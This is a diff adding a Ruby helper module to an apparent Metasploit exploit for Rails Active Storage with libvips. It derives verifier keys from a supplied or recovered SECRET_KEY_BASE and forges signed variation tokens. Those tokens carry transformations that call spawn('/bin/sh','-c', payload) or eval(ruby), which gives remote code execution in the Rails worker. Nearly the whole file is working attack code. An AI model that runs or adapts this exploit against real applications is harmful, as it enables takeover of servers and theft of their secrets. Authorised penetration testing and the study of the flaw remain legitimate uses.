+++ lib/msf/core/exploit/remote/http/rails_active_storage_vips/message_verifier.rb
@@ -1,0 +1,238 @@
+# frozen_string_literal: true
+
+require 'base64'
+require 'json'
+require 'openssl'
+require 'msf/core/exploit/remote/http/rails_active_storage_vips/png_decoder'
+
+module Msf::Exploit::Remote::HTTP::RailsActiveStorageVips
+  # Helpers for deriving and validating Active Storage verifier keys and forging signed variations.
+  module MessageVerifier
+    KEY_GENERATOR_DIGESTS = %w[sha256 sha1 sha384 sha512].freeze
+    VERIFIER_DIGESTS = {
+      40 => 'sha1',
+      64 => 'sha256',
+      96 => 'sha384',
+      128 => 'sha512'
+    }.freeze
+
+    private
+
+    def context_from_known_secret(secret_key_base)
+      print_status('Using operator-supplied SECRET_KEY_BASE')
+      signed_id = direct_upload(
+        csrf_token: csrf_token,
+        filename: 'safe.png',
+        content_type: 'image/png',
+        content: safe_png
+      )
+      token_info = signed_token_info(signed_id)
+      key_generator_digest = key_generator_digest_for(secret_key_base, token_info)
+      {
+        secret_key_base: secret_key_base,
+        signed_id: signed_id,
+        verifier_key: derive_verifier_key(secret_key_base, key_generator_digest),
+        verifier_digest: token_info[:verifier_digest],
+        message_serializer: token_info[:message_serializer],
+        verifier_source: 'a verifier key derived from operator-supplied SECRET_KEY_BASE'
+      }
+    end
+
+    def context_from_recovered_secret(read_context)
+      secret_key_base, source, key_generator_digest, token_info = recover_secret_key_base(read_context)
+      print_good("Recovered SECRET_KEY_BASE from #{source}")
+      {
+        representation_path: read_context[:representation][:path],
+        verifier_key: derive_verifier_key(secret_key_base, key_generator_digest),
+        verifier_digest: token_info[:verifier_digest],
+        message_serializer: token_info[:message_serializer],
+        verifier_source: "a verifier key derived from #{source}"
+      }
+    end
+
+    def verify_known_secret_context(context)
+      transformations = {
+        'resize_to_limit' => [1, 1]
+      }
+      statuses = {}
+      successful_route = %i[redirect legacy].find do |route|
+        context[:representation_route] = route
+        path = forged_representation_path(context, transformations)
+        res = request_representation(path)
+        next true if res&.code == 200 && res.body.to_s.b.start_with?(PngDecoder::PNG_SIGNATURE)
+
+        statuses[route] = res&.code
+        false
+      end
+      return if successful_route
+
+      context.delete(:representation_route)
+      if statuses.values.all?(&:nil?)
+        raise UnreachableError, 'No response from either standard Active Storage representation route'
+      end
+
+      details = statuses.map { |route, status| "#{route}: #{status ? "HTTP #{status}" : 'no response'}" }.join(', ')
+      raise TriggerError, "Signed safe representation did not return a PNG image (#{details})"
+    end
+
+    def forged_representation_path(context, transformations)
+      serialized = variation_payload(transformations, context[:message_serializer])
+      variation = forged_variation(context[:verifier_key], serialized, context[:verifier_digest])
+      if context[:representation_path]
+        substitute_variation_key(context[:representation_path], variation)
+      else
+        standard_representation_path(
+          context[:signed_id],
+          variation,
+          'safe.png',
+          route: context.fetch(:representation_route, :redirect)
+        )
+      end
+    end
+
+    def derive_verifier_key(secret_key_base, digest)
+      OpenSSL::PKCS5.pbkdf2_hmac(
+        secret_key_base,
+        'ActiveStorage',
+        1000,
+        64,
+        OpenSSL::Digest.new(digest.upcase)
+      )
+    end
+
+    def key_generator_digest_for(secret_key_base, token_info)
+      candidates = if datastore['KEY_GENERATOR_DIGEST'] == 'auto'
+                     KEY_GENERATOR_DIGESTS
+                   else
+                     [datastore['KEY_GENERATOR_DIGEST']]
+                   end
+      digest = candidates.find do |candidate|
+        verifier_signature(
+          derive_verifier_key(secret_key_base, candidate),
+          token_info[:encoded],
+          token_info[:verifier_digest]
+        ) == token_info[:signature]
+      end
+      raise TriggerError, 'SECRET_KEY_BASE did not validate against the signed blob ID with the selected key generator and verifier digests' unless digest
+
+      print_status("Validated #{digest.upcase} key derivation against a signed blob ID")
+      digest
+    end
+
+    def signed_token_info(token)
+      encoded, separator, signature = token.to_s.rpartition('--')
+      unless separator.present? && encoded.present? && signature.match?(/\A[0-9a-f]+\z/i) && signature.length.even?
+        raise FlowError, 'Active Storage returned an invalid signed token'
+      end
+
+      {
+        encoded: encoded,
+        signature: signature,
+        verifier_digest: verifier_digest_for(signature),
+        message_serializer: message_serializer_for(encoded)
+      }
+    end
+
+    def verifier_digest_for(signature)
+      configured = datastore['VERIFIER_DIGEST']
+      return configured unless configured == 'auto'
+
+      digest = VERIFIER_DIGESTS[signature.length]
+      raise TriggerError, 'Could not determine the Active Support verifier digest from the signed blob ID; set VERIFIER_DIGEST manually' unless digest
+
+      print_status("Detected #{digest.upcase} Active Support verifier signatures")
+      digest
+    end
+
+    def message_serializer_for(encoded)
+      configured = datastore['MESSAGE_SERIALIZER']
+      return configured.to_sym unless configured == 'auto'
+
+      serializer = detect_message_serializer(decode_signed_message(encoded))
+      raise TriggerError, 'Could not determine the Active Support message serializer from the signed blob ID; set MESSAGE_SERIALIZER manually' unless serializer
+
+      if serializer == :message_pack
+        print_status('Detected the Active Support MessagePack signed-message format; using its JSON-compatible fallback')
+        return :json
+      end
+
+      print_status("Detected the Active Support #{serializer} message serializer")
+      serializer
+    end
+
+    def decode_signed_message(encoded)
+      Base64.strict_decode64(encoded)
+    rescue ArgumentError
+      begin
+        Base64.urlsafe_decode64(encoded)
+      rescue ArgumentError => e
+        raise FlowError, "Active Storage returned invalid signed-message Base64: #{e.message}"
+      end
+    end
+
+    def detect_message_serializer(serialized)
+      return :marshal if serialized.start_with?("\x04\x08".b)
+      return :message_pack if serialized.start_with?("\xcc\x80".b)
+      return unless serialized.start_with?('{')
+
+      document = JSON.parse(serialized)
+      metadata = document['_rails']
+      return :json unless metadata.is_a?(Hash) && metadata.key?('message')
+
+      inner = Base64.strict_decode64(metadata['message'].to_s)
+      inner.start_with?("\x04\x08".b) ? :marshal : :json
+    rescue JSON::ParserError, ArgumentError
+      nil
+    end
+
+    def variation_transformations
+      case target['Type']
+      when :ruby
+        ruby_transformations(payload.encoded)
+      else
+        command_transformations(payload.encoded)
+      end
+    end
+
+    def command_transformations(command)
+      {
+        'send' => ['spawn', '/bin/sh', '-c', command]
+      }
+    end
+
+    # ImageProcessing::Chainable#apply invokes the builder's inherited send method
+    # while constructing the pipeline, so send('eval', ruby) reaches Kernel#eval
+    # and runs the payload directly in the Rails worker. The apply step then
+    # returns a non-builder value, so the representation request ends in an error
+    # after the payload has already executed.
+    def ruby_transformations(ruby)
+      {
+        'send' => ['eval', ruby]
+      }
+    end
+
+    def variation_payload(transformations, serializer)
+      message = if serializer == :marshal
+                  Marshal.dump(transformations)
+                else
+                  transformations.to_json
+                end
+      {
+        _rails: {
+          message: Base64.strict_encode64(message),
+          exp: nil,
+          pur: 'variation'
+        }
+      }.to_json
+    end
+
+    def forged_variation(verifier_key, serialized, verifier_digest)
+      encoded = Base64.strict_encode64(serialized)
+      "#{encoded}--#{verifier_signature(verifier_key, encoded, verifier_digest)}"
+    end
+
+    def verifier_signature(verifier_key, encoded, verifier_digest)
+      OpenSSL::HMAC.hexdigest(OpenSSL::Digest.new(verifier_digest.upcase), verifier_key, encoded)
+    end
+  end
+end
